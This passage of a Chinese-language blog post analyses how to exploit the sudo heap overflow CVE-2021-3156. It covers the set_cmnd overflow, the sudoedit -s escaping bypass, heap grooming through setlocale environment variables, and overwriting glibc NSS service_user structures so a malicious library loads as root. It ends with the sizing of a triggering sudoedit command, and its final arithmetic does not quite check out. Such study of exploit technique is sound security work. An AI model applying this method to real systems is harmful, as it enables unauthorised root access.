<li><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;*from&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">当前是</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;&#39;A&#39;&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">。这个</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;&#39;A&#39;&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">被复制到</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;user_args&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">缓冲区。</font></li>
<li><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;to&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">和</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;from&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">指针都向后移动。</font></li>
</ul>
</li>
<li><strong><font style="color:rgb(0, 0, 0);">内层 </font></strong><code>**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;while&lt;/font&gt;**</code><strong><font style="color:rgb(0, 0, 0);"> 循环继续</font></strong><ul>
<li><font style="color:rgb(0, 0, 0);">下一次循环的条件检查</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;while (*from)&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">:</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;*from&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">现在是第二个</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;&#39;A&#39;&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">，不是</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;\0&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">，循环继续！</font></li>
<li><font style="color:rgb(0, 0, 0);">这个</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;while&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">循环</font><strong><font style="color:rgb(0, 0, 0);">根本不会停止</font></strong><font style="color:rgb(0, 0, 0);">！它会一直复制，把所有的80个’A’都复制到</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;user_args&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">缓冲区中。</font></li>
<li><font style="color:rgb(0, 0, 0);">不仅如此，在复制完80个’A’和它的 </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;\0&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> 之后，如果 </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;from&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> 指针后面还有其他数据（比如环境变量），它会继续复制下去，直到在内存中遇到一个 </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;\0&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> 字节为止。</font></li>
</ul>
</li>
</ol>
<h3 id="如何进入set-cmnd-漏洞函数"><a href="#如何进入set-cmnd-漏洞函数" class="headerlink" title="如何进入set_cmnd 漏洞函数"></a>如何进入set_cmnd 漏洞函数</h3><p>要触发漏洞，我们需要sudo处于shell模式（例如sudo -s），这样set_cmnd()里的漏洞代码才会被执行。</p>
<h4 id="若直接使用-sudo-s"><a href="#若直接使用-sudo-s" class="headerlink" title="若直接使用 sudo -s"></a>若直接使用 sudo -s</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">File: plugins\sudoers\sudoers.c<br>            ...<br>     <span class="hljs-keyword">if</span> (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123; <span class="hljs-comment">//需要满足标志位的设置才能进入转义的流程</span><br>            ...<br>      <span class="hljs-keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123; <span class="hljs-comment">//需要满足标志位的设置才能进入转义的流程</span><br>想要获得MODE_SHELL的标志位，则需要设置-s参数，此时通过 SET(flags, MODE_SHELL)，将flag设置上MODE_SHELL，并且默认的mode是为<span class="hljs-literal">NULL</span>，因此设置-s参数可以使得flag即设置MODE_SHELL又设置MODE_RUN。<br>File: src\parse_args.c<br>   <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:<br>       sudo_settings[ARG_USER_SHELL].value = <span class="hljs-string">&quot;true&quot;</span>;<br>       SET(flags, MODE_SHELL);<br>       <span class="hljs-keyword">break</span>;<br>            ...<br>  <span class="hljs-keyword">if</span> (!mode)<br>      mode = MODE_RUN;  <span class="hljs-comment">/* running a command */</span><br>     &#125;<br></code></pre></td></tr></table></figure>

<p>使用 sudo -s 会导致 flag 即设置MODE_SHELL又设置MODE_RUN，会进入parse_args函数，该函数会将所有非字母数字的字符前方增加一个’&#39;，会把我们用于触发漏洞的\转义成\，这样漏洞就无法触发了。</p>
<h4 id="绕过-parse-args-转义函数"><a href="#绕过-parse-args-转义函数" class="headerlink" title="绕过 parse_args 转义函数"></a>绕过 parse_args 转义函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">/src/parse_argsc.文件中parse_args转义代码的条件如<span class="hljs-number">454</span>行，/plugins/sudoers.c文件中set_cmnd反转义条件如<span class="hljs-number">757</span>和<span class="hljs-number">796</span>行。<br><span class="hljs-number">454</span>: <span class="hljs-keyword">if</span> (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123;<br><span class="hljs-number">757</span>: <span class="hljs-keyword">if</span> (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123;<br><span class="hljs-number">796</span>: <span class="hljs-keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;<br></code></pre></td></tr></table></figure>

<p>若使用sudoedit调用，程序会给mode设置MODE_EDIT，同时-s 参数会设置 MODE_SHELL。重要的是，MODE_RUN 不会被设置，程序不会经过parse_args 函数。</p>
<h2 id="可利用堆块分析"><a href="#可利用堆块分析" class="headerlink" title="可利用堆块分析"></a>可利用堆块分析</h2><p>现在程序中存在一个明显的堆溢出漏洞，因此梳理一下堆溢出如何利用：</p>
<ul>
<li>找到一个堆块，该堆块的值会影响程序的执行流程，称之为<strong>可利用堆块</strong></li>
<li>找到可以随意<strong>控制堆块位置</strong>的操作，将<strong>漏洞函数</strong>申请的堆块部署在可利用堆块的上方，当堆溢出发生时，可以将可利用堆块的值改写为我们构造的值</li>
</ul>
<p><img src="/../img/CVE-2021-3156_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E9%AB%98%E9%98%B6%E5%88%A9%E7%94%A8%EF%BC%9A%E5%A0%86%E9%A3%8E%E6%B0%B4.md/2.png"></p>
<h3 id="nss-分析（会调用不同的动态链接库）"><a href="#nss-分析（会调用不同的动态链接库）" class="headerlink" title="nss 分析（会调用不同的动态链接库）"></a>nss 分析（会调用不同的动态链接库）</h3><p>nss（Name Service Switch）用于解析和获取不同类型的名称信息，例如如何通过用名称去获取用户信息，在sudo需要获取用户信息时则需要调用nss。</p>
<p>重点：在使用 nss 去获取信息的时候，其实是通过<strong>不同的动态链接库</strong>去执行相应的行为，这些库的文件名则存在于&#x2F;etc&#x2F;nsswitch.conf的配置文件中</p>
<p><img src="/../img/CVE-2021-3156_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E9%AB%98%E9%98%B6%E5%88%A9%E7%94%A8%EF%BC%9A%E5%A0%86%E9%A3%8E%E6%B0%B4.md/3.png"></p>
<p>以下为动态连接库的文件，比如 passwd 就会用到 libnss_compat.so；hosts 会用到 libnss_dns.so 和 libnss_files.so</p>
<p><img src="/../img/CVE-2021-3156_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E9%AB%98%E9%98%B6%E5%88%A9%E7%94%A8%EF%BC%9A%E5%A0%86%E9%A3%8E%E6%B0%B4.md/4.png"></p>
<p>在service_table 链表中装有 nss 中的 passwd、group、shadow、gshadow 等节点</p>
<h4 id="关键代码"><a href="#关键代码" class="headerlink" title="关键代码"></a>关键代码</h4><p>nss 在加载这些动态链接库的时候需要依赖 nss_load_library 函数，首先查看漏洞利用的关键代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span><br><span class="hljs-title function_">nss_load_library</span> <span class="hljs-params">(service_user *ni)</span>				<span class="hljs-meta"># ni指针指向堆上service_user结构体，每个service_user表示一个NSS服务模块</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (ni-&gt;library == <span class="hljs-literal">NULL</span>)				# 检查service_user结构体的library指针是否初始化			<br>    &#123;<br>      <span class="hljs-type">static</span> name_database default_table;<br>      ni-&gt;library = nss_new_service (service_table ?: &amp;default_table,ni-&gt;name);			# 始化一个新的库描述结构体，并挂载到ni-&gt;library，传入的ni-&gt;name决定加载哪个服务，例如passwd对应libnss_compat.so<br>      <span class="hljs-title function_">if</span> <span class="hljs-params">(ni-&gt;library == <span class="hljs-literal">NULL</span>)</span><br>	<span class="hljs-keyword">return</span> -1;<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (ni-&gt;library-&gt;lib_handle == <span class="hljs-literal">NULL</span>)				# 检查service_user结构体的library是否被加载过，若没被加载过就会拼接字符串并执行dlopen<br>    &#123;<br>      ··· ···<br>          # 动态加载库的字符串拼接过程 ： shlib_name = <span class="hljs-string">&quot;libnss_&quot;</span> + ni-&gt;name + <span class="hljs-string">&quot;.so&quot;</span> + __nss_shlib_revision<br>      __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name, <span class="hljs-string">&quot;libnss_&quot;</span>), ni-&gt;name), <span class="hljs-string">&quot;.so&quot;</span>),__nss_shlib_revision);<br><br>      ni-&gt;library-&gt;lib_handle = __libc_dlopen (shlib_name);			# 动态加载库<br>      ··· ···<br>      ··· ···<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>关键利用点：</p>
<p>我们的目的是加载一个自己写的恶意的 libc 库，这个库 libc 库中包含提升到 root 权限的相关操作。</p>
<p>恶意的 libc 库需要被__libc_dlopen 函数触发，调用到__libc_dlopen 函数需要 service_use 结构体中的动态库句柄（ni-&gt;library-&gt;lib_handle）为 null，如果我们可以通过堆溢出到 ni 所在的堆块，将 ni-&gt;library 覆盖为 0 即可（因为 ni-&gt;library 为 0 会执行第一个 if，执行第一个 if 会调用nss_new_service 对 library 进行初始化，初始化的 lib_handle 必然为 null）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">service_user</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* And the link to the next entry.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">service_user</span> *<span class="hljs-title">next</span>;</span><br>  <span class="hljs-comment">/* Action according to result.  */</span><br>  lookup_actions actions[<span class="hljs-number">5</span>];<br>  <span class="hljs-comment">/* Link to the underlying library object.  */</span><br>  service_library *library;<br>  <span class="hljs-comment">/* Collection of known functions.  */</span><br>  <span class="hljs-type">void</span> *known;<br>  <span class="hljs-comment">/* Name of the service (`files&#x27;, `dns&#x27;, `nis&#x27;, ...).  */</span><br>  <span class="hljs-type">char</span> name[<span class="hljs-number">0</span>];<br>&#125; service_user;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">name_database_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* And the link to the next entry.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">name_database_entry</span> *<span class="hljs-title">next</span>;</span><br>  <span class="hljs-comment">/* List of service to be used.  */</span><br>  service_user *service;<br>  <span class="hljs-comment">/* Name of the database.  */</span><br>  <span class="hljs-type">char</span> name[<span class="hljs-number">0</span>];<br>&#125; name_database_entry;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">name_database</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* List of all known databases.  */</span><br>  name_database_entry *entry;<br>  <span class="hljs-comment">/* List of libraries with service implementation.  */</span><br>  service_library *library;<br>&#125; name_database;<br></code></pre></td></tr></table></figure>









<h3 id="漏洞利用梳理："><a href="#漏洞利用梳理：" class="headerlink" title="漏洞利用梳理："></a>漏洞利用梳理：</h3><p>在用户执行sudoedit命令的时候，由于set_cmnd函数校验不严格导致用户输入可以绕过字符边界校验造成user_args堆溢出，接着我们分析到sudoedit在解析的时候会调用nss相关函数，而nss其实就是通过加载不同的动态链接库执行相应操作，那么我们可以通过user_args堆溢出覆盖service_user-&gt;library进行库描述结构体初始化操作，并且修改service_user-&gt;name来构造一个恶意的动态链接库，这个恶意的动态链接库会被__libc_dlopen函数加载并提权至root。</p>
<p>现在我们已经找到了可以利用的堆块，接下来我们需要构造堆布局，将可以发生溢出的堆（user_argv）布局到可利用堆块堆（service_user)的低地址处。</p>
<h2 id="堆布局分析"><a href="#堆布局分析" class="headerlink" title="堆布局分析"></a>堆布局分析</h2><p>已知使用环境变量LC_ALL 在setlocale 函数中完成的堆布局，经过分析，setlocale 中有非常多的堆申请和释放操作，所以这里我们重点关注我们可操作的部分。</p>
<p>glibc&#x2F;locale&#x2F;setlocale.c : 218</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *<br><span class="hljs-title function_">setlocale</span> <span class="hljs-params">(<span class="hljs-type">int</span> category, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *locale)</span><br>&#123;<br>  <span class="hljs-type">char</span> *locale_path;<br>  <span class="hljs-type">size_t</span> locale_path_len;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *locpath_var;<br>  <span class="hljs-type">char</span> *composite;<br><br>  ··· ···<br>      <br>  locale_path = <span class="hljs-literal">NULL</span>;<br>  locale_path_len = <span class="hljs-number">0</span>;<br><br>  ··· ···<br><br>  <span class="hljs-keyword">if</span> (category == LC_ALL)<br>    &#123;<br>      ··· ···<br>      ··· ···<br>      <span class="hljs-comment">/* Load the new data for each category.  */</span>    <br>      <span class="hljs-keyword">while</span> (category-- &gt; <span class="hljs-number">0</span>)<br>	<span class="hljs-keyword">if</span> (category != LC_ALL)<br>	  &#123;<span class="hljs-comment">//关键处理函数 _nl_find_locale</span><br>	    newdata[category] = _nl_find_locale (locale_path, locale_path_len,<br>						 category,<br>						 &amp;newnames[category]);<br><br>	    <span class="hljs-keyword">if</span> (newdata[category] == <span class="hljs-literal">NULL</span>)<br>	      &#123;<span class="hljs-comment">//返回null 则会跳出循环</span><br>		···<br>		<span class="hljs-keyword">break</span>;<br>	      &#125;<br><br>	    ··· ···<br><br>	    <span class="hljs-comment">/* Make a copy of locale name.  */</span><br>	    <span class="hljs-keyword">if</span> (newnames[category] != _nl_C_name)<br>	      &#123;<br>		<span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span> (newnames[category],<br>			    _nl_global_locale.__names[category]) == <span class="hljs-number">0</span>)<br>		  newnames[category] = _nl_global_locale.__names[category];<br>		<span class="hljs-keyword">else</span><br>		  &#123;<br>            <span class="hljs-comment">//这个strdup 很关键</span><br>		    newnames[category] = __strdup (newnames[category]);<br>		    <span class="hljs-keyword">if</span> (newnames[category] == <span class="hljs-literal">NULL</span>)<br>		      <span class="hljs-keyword">break</span>;<br>		  &#125;<br>	      &#125;<br>	  &#125;<br><br>      <span class="hljs-comment">/* Create new composite name.  */</span><br>      composite = (category &gt;= <span class="hljs-number">0</span><br>		   ? <span class="hljs-literal">NULL</span> : new_composite_name (LC_ALL, newnames));<br>      <span class="hljs-keyword">if</span> (composite != <span class="hljs-literal">NULL</span>)<br>	&#123;<br>        ··· ···<br>	&#125;<br>      <span class="hljs-keyword">else</span><br>	<span class="hljs-keyword">for</span> (++category; category &lt; __LC_LAST; ++category)<span class="hljs-comment">//校验</span><br>	  <span class="hljs-keyword">if</span> (category != LC_ALL &amp;&amp; newnames[category] != _nl_C_name<br>	      &amp;&amp; newnames[category] != _nl_global_locale.__names[category])<br>        <span class="hljs-comment">//这个free 很关键，这里是一处循环free，可以集中free 一堆chunk</span><br>	    <span class="hljs-built_in">free</span> ((<span class="hljs-type">char</span> *) newnames[category]);<br><br>      <span class="hljs-comment">/* Critical section left.  */</span><br>      __libc_rwlock_unlock (__libc_setlocale_lock);<br><br>      <span class="hljs-comment">/* Free the resources.  */</span><br>      <span class="hljs-built_in">free</span> (locale_path);<br>      <span class="hljs-built_in">free</span> (locale_copy);<br><br>      <span class="hljs-keyword">return</span> composite;<br>    &#125;<br>	<br>    ··· ···<br>    ··· ···<br>	  <br>&#125;<br>libc_hidden_def (setlocale)<br></code></pre></td></tr></table></figure>



<p>setlocale 函数是关于一些语言环境有关的，相关环境变量参数有以下几种：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> __LC_CTYPE		 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __LC_NUMERIC		 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __LC_TIME		 2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __LC_COLLATE		 3</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __LC_MONETARY		 4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __LC_MESSAGES		 5</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __LC_ALL		 6</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __LC_PAPER		 7</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __LC_NAME		 8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __LC_ADDRESS		 9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __LC_TELEPHONE		10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __LC_MEASUREMENT	11</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __LC_IDENTIFICATION	12</span><br></code></pre></td></tr></table></figure>



<p>根据传入参数 category 的值来去环境变量中寻找对应的参数采取行动。在sudo 中使用的是 setlocale(LC_ALL,””); 当传入参数是LC_ALL 时，会从 LC_IDENTIFICATION 开始向前遍历所有的变量。对于每一个调用 _nl_find_locale 函数，这个函数里面比较复杂，但返回的 newnames[category] 其实就是对应环境变量的值，会在接下来调用strdup 函数将该字符串拷贝到堆上。由于传入的是LC_ALL ，那么会生成一个对应的字符串数组，接下来会和全局变量默认值进行一次校验，如果校验失败，那么就会将其释放(很容易构造出失败的输入)。</p>
<p>换言之，我们可以通过操作在这里进行x次strdup 的堆申请与x 次的free 刚申请的chunk。</p>
<p>根据输入的环境变量的值进行strdup 操作，最后会将strdup 生成的多个chunk 一口气free 掉。</p>
<h3 id="漏洞利用梳理：-1"><a href="#漏洞利用梳理：-1" class="headerlink" title="漏洞利用梳理："></a>漏洞利用梳理：</h3><ol>
<li>setlocale()函数的行为可以被环境变量（如LC_ALL, LC_CTYPE等）影响。通过设置大量特定长度的环境变量，可以在service_user结构体被分配之前，在堆上进行大量的malloc和free操作。这就像在下棋前预先排布好棋子，通过这些操作，在堆内存中“雕刻”出我们想要的布局：即在即将分配service_user结构体的位置旁边，留下一个大小合适的、空闲的内存块（chunk）。</li>
<li>当轮到漏洞函数set_cmnd()为user_args申请内存时，我们通过控制命令行参数的长度，使其申请的内存大小恰好等于我们预留的那个空闲内存块的大小。ptmalloc分配器就会把这块内存分配给user_args。如此一来，user_args的缓冲区就完美地坐落在了service_user结构体的前面，接下来的 user_args 堆精确溢出覆盖 service_user 结构体的 service_user-&gt;library 和 service_user-&gt;name</li>
</ol>
<p>如果能够在service_table初始化之前，在堆的前面留下多个0x20大小的堆，并在较远处留下0x40大小的堆，就正好将name_database_entry以及service_user结构体分开较大距离，方便溢出，并在user_args分配前将靠近service_user前面的堆释放，留给user_args获取，这样就能完美构造堆溢出的条件。</p>
<h2 id="EXP-实战"><a href="#EXP-实战" class="headerlink" title="EXP 实战"></a>EXP 实战</h2><h3 id="堆布局思路"><a href="#堆布局思路" class="headerlink" title="堆布局思路"></a>堆布局思路</h3><p><img src="/../img/CVE-2021-3156_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E9%AB%98%E9%98%B6%E5%88%A9%E7%94%A8%EF%BC%9A%E5%A0%86%E9%A3%8E%E6%B0%B4.md/5.png"></p>
<ol>
<li><font style="color:rgb(31, 35, 40);">由于1246chunk 都是0x20大小的chunk，空间太小，不关注。</font></li>
<li><font style="color:rgb(31, 35, 40);">关注 3，5 号chunk 和7号chunk之间如何插入一个大小特别的0xX0 的chunk(不会在 user_args chunk 申请之前被消耗掉)。大致如图：</font></li>
</ol>
<p><img src="/../img/CVE-2021-3156_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E9%AB%98%E9%98%B6%E5%88%A9%E7%94%A8%EF%BC%9A%E5%A0%86%E9%A3%8E%E6%B0%B4.md/6.png"></p>
<p>整个堆布局过程中参与的chunk 都是setlocale 申请的内存</p>
<ol start="3">
<li>所以最终我们的思路就是在setlocale申请两个0x40 大小的chunk，再申请一个0xa0大小的chunk(即上面提到的0xX0的chuank)，再申请一个0x40的chunk，这样会按照相反的顺序释放，然后再nss_parse_file 函数中会按照相同的顺序申请，并且，在nss_parse_file 函数中 getline 会申请0x80 的chunk 将我们预留的 0xa0 chunk “保护” 起来</li>
</ol>
<h3 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h3><p>计算被移除 chunk 和溢出 chunk 之间的距离</p>
<p><img src="/../img/CVE-2021-3156_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E9%AB%98%E9%98%B6%E5%88%A9%E7%94%A8%EF%BC%9A%E5%A0%86%E9%A3%8E%E6%B0%B4.md/7.png"></p>
<p>0x5576b5ac7000-0x5576b5ac69b0&#x3D;0x650</p>
<p><font style="color:rgb(31, 35, 40);">可以将输入参数总共0xa0 分成两个部分 x 个</font><code>&lt;font style=&quot;color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);&quot;&gt;\\&lt;/font&gt;</code><font style="color:rgb(31, 35, 40);"> (每个是一个独立字符串，占两个字节) 和一个</font><code>&lt;font style=&quot;color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);&quot;&gt;&#39;a&#39; * y&lt;/font&gt;</code><font style="color:rgb(31, 35, 40);"> (y个字符a是一个字符串，占y+1字节)，2x+y &#x3D; 0xa0-0x10 (这里0xa0-0x10是因为我们的 user_args chunk 是0xa0大小，但实际申请需要减 0x10)，最后的命令形如 ：</font></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">sudoedit -s \\ \\ \\ ...(x个)... \\ &quot;aaaa...(y个)...aaa&quot;<br></code></pre></td></tr></table></figure>

<p><font style="color:rgb(31, 35, 40);">计算x， y使：</font></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">(x+y)+(x+y)+(x+y+1)+(x+y-2)+... ...+(y+1) 刚好 &lt; 0x650 <br>2x+y = 0xa0-0x10<br></code></pre></td></tr></table></figure>

<p><font style="color:rgb(31, 35, 40);">第一个等式的原理就是，由于输入有多个</font><font style="color:rgb(31, 35, 40);"> </font><code>&lt;font style=&quot;color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);&quot;&gt;\\&lt;/font&gt;</code><font style="color:rgb(31, 35, 40);"> </font><font style="color:rgb(31, 35, 40);">所以每次拷贝都会溢出，每次溢出会比上次少1字节，所以等差数列相加。化简得到：</font></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">(x+y)+(x+2y+1)·x/2=0x650<br>2x+y = 0x90<br></code></pre></td></tr></table></figure>

<p><font style="color:rgb(31, 35, 40);">解得：</font></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">x=11<br>y=121<br></code></pre></td></tr></table></figure>

